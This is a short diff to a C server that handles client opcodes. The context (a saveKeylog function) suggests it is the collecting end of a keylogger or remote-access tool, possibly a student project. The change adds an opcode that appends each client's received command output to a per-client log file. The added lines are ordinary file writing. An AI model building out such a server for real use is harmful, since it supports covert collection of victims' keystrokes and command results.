@@ -51,6 +51,7 @@ void saveKeylog(int client_sock)
 void handleOpcode(message_t msg, int clientSock)
 {
     char filename[BUFFER_SIZE];
+    int fd;
     switch (msg.opCode)
     {
     case 'K':
@@ -102,6 +103,16 @@ void handleOpcode(message_t msg, int clientSock)
         // printf("Primeste in fisierul %s\n", filename);
         fflush(0);
         recvFile(clientSock, filename);
+        break;
+    case 'M':
+        snprintf(filename, BUFFER_SIZE, "%s/Commands_%s.txt",
+                 clientHndler.clientsAttr[clientSock].name,
+                 clientHndler.clientsAttr[clientSock].name);
+        fd = open(filename, O_CREAT | O_APPEND | O_WRONLY, 0664);
+        write(fd, msg.buffer, msg.size);
+        strcpy(msg.buffer, "\n======================================\n");
+        write(fd, msg.buffer, strlen(msg.buffer));
+        close(fd);
         break;
     default:
         fflush(NULL);
